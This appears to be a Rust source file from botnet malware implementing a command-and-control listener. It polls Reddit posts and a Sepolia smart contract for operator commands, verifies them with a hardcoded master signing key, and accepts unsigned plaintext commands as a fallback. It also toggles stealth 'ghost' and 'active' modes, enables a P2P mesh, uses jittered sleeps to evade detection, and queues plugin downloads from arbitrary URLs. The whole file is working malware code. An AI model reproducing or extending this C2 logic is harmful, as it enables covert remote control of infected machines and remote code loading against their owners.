use super::state::{CommandState, SystemMode};
use crate::n::bootstrap::reddit::RedditProvider;
use crate::d::eth_listener::check_sepolia_fallback;
use log::{info, debug, warn};
use std::time::Duration;
use rand::Rng;
use smol::Timer;

use async_channel::Sender;

pub fn start_listener(state: CommandState, cmd_tx: Sender<Vec<u8>>) {
    smol::spawn(async move {
        let reddit = RedditProvider;
        info!("[C2] Starting Ghost Mode Listener (Reddit + Sepolia)...");
        crate::k::debug::log_op!("C2", "Listener Started (Ghost Mode)");

        loop {
            // calculated jitter
            use ed25519_dalek::{VerifyingKey, Signature, Verifier};
            use base64::Engine;

            // 1. Poll Reddit (Blocking I/O offloaded)
            let raw_cmd = smol::unblock(|| {
                let r = RedditProvider;
                r.poll_command()
            }).await;

            let cmd = if let Some(raw) = raw_cmd {
                if raw.starts_with("CMD:") {
                    // Protocol: CMD:{BASE64_PAYLOAD}.{HEX_SIG}
                    // Master Public Key (Hardcoded)
                    // e9e619617ff0e224290e27b779e3ea5b7a94e59b6647033896f01fb7f921096e
                    let pub_bytes = hex::decode("e9e619617ff0e224290e27b779e3ea5b7a94e59b6647033896f01fb7f921096e").unwrap_or_default();
                    
                    if let Ok(verifying_key) = VerifyingKey::from_bytes(&pub_bytes[..].try_into().unwrap_or([0u8;32])) {
                        let parts: Vec<&str> = raw.trim_start_matches("CMD:").split('.').collect();
                        if parts.len() == 2 {
                            let b64_payload = parts[0];
                            let hex_sig = parts[1];
                            
                            if let (Ok(payload), Ok(sig_bytes)) = (
                                base64::engine::general_purpose::STANDARD.decode(b64_payload),
                                hex::decode(hex_sig)
                            ) {
                                let signature = Signature::from_bytes(&sig_bytes.try_into().unwrap_or([0u8;64]));
                                if verifying_key.verify(&payload, &signature).is_ok() {
                                        crate::k::debug::log_op!("C2", "Signature VERIFIED (Master).");
                                        Some(String::from_utf8_lossy(&payload).to_string())
                                    } else {
                                        crate::k::debug::log_err!("Signature INVALID! Dropping command.");
                                        None
                                    }
                            } else { None }
                        } else { None }
                    } else { None }
                } else {
                    // Legacy/Plaintext Fallback
                    // crate::k::debug::log_detail!("Unsigned Command Received");
                    Some(raw) 
                }
            } else {
                None
            };
            
            // Re-assign for inner logic
            match cmd {
                Some(cmd_str) => {
                    if cmd_str == "active" {
                         if state.set_mode(SystemMode::Active) {
                             info!("[C2] REDDIT COMMAND: ACTIVATE NETWORK");
                         }
                    } else if cmd_str == "ghost" {
                        if state.set_mode(SystemMode::Ghost) {
                             info!("[C2] REDDIT COMMAND: ENTER GHOST MODE");
                        }
                    } else if cmd_str == "enable_c2" {
                        // DEPRECATED - C2 is always on (Reddit/ETH)
                        info!("[C2] REDDIT COMMAND: enable_c2 ignored (C2 always active)");
                    } else if cmd_str == "enable_p2p" {
                        // Enable P2P subsystem (mesh networking)
                        if state.enable_p2p() {
                            info!("[C2] REDDIT COMMAND: P2P SUBSYSTEM ENABLED");
                        }
                    } else if cmd_str == "enable_all" {
                        // Enable P2P + Active mode
                        state.enable_p2p();
                        state.set_mode(SystemMode::Active);
                        info!("[C2] REDDIT COMMAND: P2P ENABLED + ACTIVE MODE");
                    } else if cmd_str.starts_with("add_plugin ") {

                        // Protocol: add_plugin {url}
                        let url = cmd_str.trim_start_matches("add_plugin ").trim();
                        info!("[C2] Command: Add Plugin {}", url);
                        
                        // Opcode 0x05: Download Plugin
                        // Payload: URL bytes
                        let mut packet = vec![0x05];
                        packet.extend_from_slice(url.as_bytes());
                        let _ = cmd_tx.send(packet).await;
                        
                    } else if cmd_str.contains(":") {
                        // Protocol: {plugin_name}:{command}
                        // Example: "test:run"
                        info!("[C2] Command: Plugin Dispatch '{}'", cmd_str);
                        
                        // Opcode 0x10: Named Plugin Dispatch
                        // Payload: Raw string bytes "name:cmd" via Runtime splitter
                        let mut packet = vec![0x10];
                        packet.extend_from_slice(cmd_str.as_bytes());
                        let _ = cmd_tx.send(packet).await;
                    }
                }
                None => {
                    debug!("[C2] No command found on Reddit.");
                    crate::k::debug::log_detail!("Reddit Poll: No Command.");
                }
            }

            // 2. Poll Sepolia (Smart Contract)
            // If we get valid peers, it implies valid signature -> Active
            if let Some((_peers, _)) = check_sepolia_fallback().await {
                if state.set_mode(SystemMode::Active) {
                    info!("[C2] SEPOLIA SIGNAL: ACTIVATE NETWORK");
                }
            } else {
                crate::k::debug::log_detail!("Sepolia Poll: No Signal.");
            }

            // 3. Sleep with jitter
            // 3. Sleep with jitter (45s - 90s)
            let jitter = rand::thread_rng().gen_range(45..90);
            
            crate::k::debug::log_op!("C2", format!("Sleeping {}s...", jitter));
            Timer::after(Duration::from_secs(jitter)).await;
        }
    }).detach();
}
